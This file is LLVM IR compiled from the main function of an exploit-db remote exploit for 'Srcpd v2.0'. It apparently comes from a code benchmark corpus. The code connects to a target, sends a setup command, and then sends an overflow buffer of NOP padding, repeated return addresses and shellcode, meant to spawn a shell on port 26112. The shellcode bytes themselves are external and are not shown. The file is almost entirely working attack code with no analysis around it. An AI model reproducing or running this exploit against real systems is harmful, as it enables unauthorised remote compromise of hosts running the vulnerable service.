; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23049.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23049.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i64, i32 }

@RET = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [9 x i8] c"h:p:o:t:\00", align 1
@optarg = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [50 x i8] c" ** ***************************************** **\0A\00", align 1
@.str.2 = private unnamed_addr constant [50 x i8] c" ** Srcpd v2.0 remote exploit by m00 Security **\0A\00", align 1
@.str.3 = private unnamed_addr constant [14 x i8] c" Conneting...\00", align 1
@.str.4 = private unnamed_addr constant [11 x i8] c" connect()\00", align 1
@targets = common dso_local global %struct.TYPE_2__* null, align 8
@.str.5 = private unnamed_addr constant [22 x i8] c"OK\0A using RET = 0x%x\0A\00", align 1
@.str.6 = private unnamed_addr constant [12 x i8] c" Sending...\00", align 1
@EOF = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [11 x i8] c"go 11111\0D\0A\00", align 1
@NOP = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [12 x i8] c"set 1 lock \00", align 1
@scode = common dso_local global i8* null, align 8
@SCODELEN = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [4 x i8] c"OK\0A\00", align 1
@.str.10 = private unnamed_addr constant [58 x i8] c" now, if you was lucky with ret, shell spawned on 26112.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i64*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %17 = load i64, i64* @RET, align 8
  store i64 %17, i64* %9, align 8
  store i32 12340, i32* %12, align 4
  %18 = load i32, i32* %4, align 4
  %19 = icmp slt i32 %18, 4
  br i1 %19, label %20, label %25

20:                                               ; preds = %2
  %21 = load i8**, i8*** %5, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = call i32 @usage(i8* %23)
  br label %25

25:                                               ; preds = %20, %2
  br label %26

26:                                               ; preds = %47, %25
  %27 = load i32, i32* %4, align 4
  %28 = load i8**, i8*** %5, align 8
  %29 = call i32 @getopt(i32 %27, i8** %28, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str, i64 0, i64 0))
  store i32 %29, i32* %11, align 4
  %30 = icmp ne i32 %29, -1
  br i1 %30, label %31, label %48

31:                                               ; preds = %26
  %32 = load i32, i32* %11, align 4
  switch i32 %32, label %47 [
    i32 104, label %33
    i32 112, label %35
    i32 111, label %38
    i32 116, label %43
    i32 63, label %46
  ]

33:                                               ; preds = %31
  %34 = load i8*, i8** @optarg, align 8
  store i8* %34, i8** %6, align 8
  br label %47

35:                                               ; preds = %31
  %36 = load i8*, i8** @optarg, align 8
  %37 = call i32 @atoi(i8* %36)
  store i32 %37, i32* %12, align 4
  br label %47

38:                                               ; preds = %31
  %39 = load i8*, i8** @optarg, align 8
  %40 = call i64 @atol(i8* %39)
  %41 = load i64, i64* %9, align 8
  %42 = sub nsw i64 %41, %40
  store i64 %42, i64* %9, align 8
  br label %47

43:                                               ; preds = %31
  %44 = load i8*, i8** @optarg, align 8
  %45 = call i32 @atoi(i8* %44)
  store i32 %45, i32* %16, align 4
  br label %47

46:                                               ; preds = %31
  br label %47

47:                                               ; preds = %31, %46, %43, %38, %35, %33
  br label %26

48:                                               ; preds = %26
  %49 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.1, i64 0, i64 0))
  %50 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.2, i64 0, i64 0))
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.1, i64 0, i64 0))
  %52 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.3, i64 0, i64 0))
  %53 = load i8*, i8** %6, align 8
  %54 = load i32, i32* %12, align 4
  %55 = call i32 @make_connect(i8* %53, i32 %54)
  store i32 %55, i32* %13, align 4
  %56 = icmp sle i32 %55, 0
  br i1 %56, label %57, label %60

57:                                               ; preds = %48
  %58 = call i32 @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.4, i64 0, i64 0))
  %59 = call i32 @exit(i32 -1) #3
  unreachable

60:                                               ; preds = %48
  %61 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %62 = load i32, i32* %16, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %61, i64 %63
  %65 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %64, i32 0, i32 0
  %66 = load i64, i64* %65, align 8
  store i64 %66, i64* %9, align 8
  %67 = load i64, i64* %9, align 8
  %68 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.5, i64 0, i64 0), i64 %67)
  %69 = call i64 @malloc(i32 220)
  %70 = inttoptr i64 %69 to i8*
  store i8* %70, i8** %7, align 8
  %71 = call i64 @malloc(i32 512)
  %72 = inttoptr i64 %71 to i8*
  store i8* %72, i8** %8, align 8
  %73 = load i32, i32* %13, align 4
  %74 = load i8*, i8** %8, align 8
  %75 = call i32 @recv(i32 %73, i8* %74, i32 512, i32 0)
  store i32 %75, i32* %14, align 4
  %76 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.6, i64 0, i64 0))
  %77 = load i32, i32* %14, align 4
  %78 = icmp sle i32 %77, 0
  br i1 %78, label %83, label %79

79:                                               ; preds = %60
  %80 = load i32, i32* %14, align 4
  %81 = load i32, i32* @EOF, align 4
  %82 = icmp eq i32 %80, %81
  br i1 %82, label %83, label %84

83:                                               ; preds = %79, %60
  store i32 -1, i32* %3, align 4
  br label %152

84:                                               ; preds = %79
  %85 = load i32, i32* %13, align 4
  %86 = call i32 @send(i32 %85, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.7, i64 0, i64 0), i32 10, i32 0)
  %87 = load i32, i32* %13, align 4
  %88 = load i8*, i8** %8, align 8
  %89 = call i32 @recv(i32 %87, i8* %88, i32 512, i32 0)
  store i32 %89, i32* %14, align 4
  %90 = load i32, i32* %14, align 4
  %91 = icmp sle i32 %90, 0
  br i1 %91, label %96, label %92

92:                                               ; preds = %84
  %93 = load i32, i32* %14, align 4
  %94 = load i32, i32* @EOF, align 4
  %95 = icmp eq i32 %93, %94
  br i1 %95, label %96, label %97

96:                                               ; preds = %92, %84
  store i32 -1, i32* %3, align 4
  br label %152

97:                                               ; preds = %92
  %98 = load i8*, i8** %7, align 8
  %99 = load i32, i32* @NOP, align 4
  %100 = call i32 @memset(i8* %98, i32 %99, i32 200)
  %101 = load i8*, i8** %7, align 8
  %102 = call i32 @memcpy(i8* %101, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.8, i64 0, i64 0), i32 11)
  %103 = load i8*, i8** %7, align 8
  %104 = getelementptr inbounds i8, i8* %103, i64 11
  %105 = bitcast i8* %104 to i64*
  store i64* %105, i64** %10, align 8
  store i32 0, i32* %15, align 4
  br label %106

106:                                              ; preds = %119, %97
  %107 = load i32, i32* %15, align 4
  %108 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %109 = load i32, i32* %16, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %108, i64 %110
  %112 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %111, i32 0, i32 1
  %113 = load i32, i32* %112, align 8
  %114 = icmp slt i32 %107, %113
  br i1 %114, label %115, label %122

115:                                              ; preds = %106
  %116 = load i64, i64* %9, align 8
  %117 = load i64*, i64** %10, align 8
  %118 = getelementptr inbounds i64, i64* %117, i32 1
  store i64* %118, i64** %10, align 8
  store i64 %116, i64* %117, align 8
  br label %119

119:                                              ; preds = %115
  %120 = load i32, i32* %15, align 4
  %121 = add nsw i32 %120, 1
  store i32 %121, i32* %15, align 4
  br label %106

122:                                              ; preds = %106
  %123 = load i64*, i64** %10, align 8
  %124 = getelementptr inbounds i64, i64* %123, i32 1
  store i64* %124, i64** %10, align 8
  store i64 32, i64* %123, align 8
  %125 = load i8*, i8** %7, align 8
  %126 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %127 = load i32, i32* %16, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %126, i64 %128
  %130 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %129, i32 0, i32 1
  %131 = load i32, i32* %130, align 8
  %132 = mul nsw i32 %131, 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds i8, i8* %125, i64 %133
  %135 = getelementptr inbounds i8, i8* %134, i64 12
  %136 = load i8*, i8** @scode, align 8
  %137 = load i32, i32* @SCODELEN, align 4
  %138 = call i32 @memcpy(i8* %135, i8* %136, i32 %137)
  %139 = load i8*, i8** %7, align 8
  %140 = getelementptr inbounds i8, i8* %139, i64 219
  store i8 0, i8* %140, align 1
  %141 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i64 0, i64 0))
  %142 = load i32, i32* %13, align 4
  %143 = load i8*, i8** %7, align 8
  %144 = call i32 @send(i32 %142, i8* %143, i32 220, i32 0)
  %145 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.10, i64 0, i64 0))
  %146 = load i8*, i8** %7, align 8
  %147 = call i32 @free(i8* %146)
  %148 = load i8*, i8** %8, align 8
  %149 = call i32 @free(i8* %148)
  %150 = load i32, i32* %13, align 4
  %151 = call i32 @close(i32 %150)
  store i32 0, i32* %3, align 4
  br label %152

152:                                              ; preds = %122, %96, %83
  %153 = load i32, i32* %3, align 4
  ret i32 %153
}

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i64 @atol(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @make_connect(i8*, i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @free(i8*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
